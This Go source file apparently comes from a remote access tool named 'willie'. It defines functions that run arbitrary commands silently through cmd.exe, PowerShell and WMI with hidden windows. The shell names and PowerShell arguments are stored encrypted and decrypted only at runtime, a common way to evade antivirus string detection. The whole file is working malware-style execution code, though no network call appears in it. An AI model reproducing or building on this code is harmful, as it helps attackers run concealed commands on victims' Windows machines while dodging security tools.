package adminutils

import (
	"os/exec"
	"strings"
	"syscall"
	"github.com/kensh1ro/willie/config"
)

func Cmd(command string) string {
	shell := config.Decrypt(config.CMD)
	cmd := exec.Command(string(shell), append([]string{"/C"},strings.Split(command, " ")...)...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, _ := cmd.CombinedOutput()
	return string(output)
}

func Powershell(command string) string {
	shell := config.Decrypt(config.POWERSHELL)
	cmd := exec.Command(string(shell), append(strings.Split(config.Decrypt(config.POWERSHELL_ARGS)," "),strings.Split(command, " ")...)...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, _ := cmd.CombinedOutput()
	return string(output)
}

func WMI(command string) string {
	shell := config.Decrypt(config.WMI)
	cmd := exec.Command(string(shell), strings.Split(command, " ")...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, _ := cmd.CombinedOutput()
	return string(output)
}
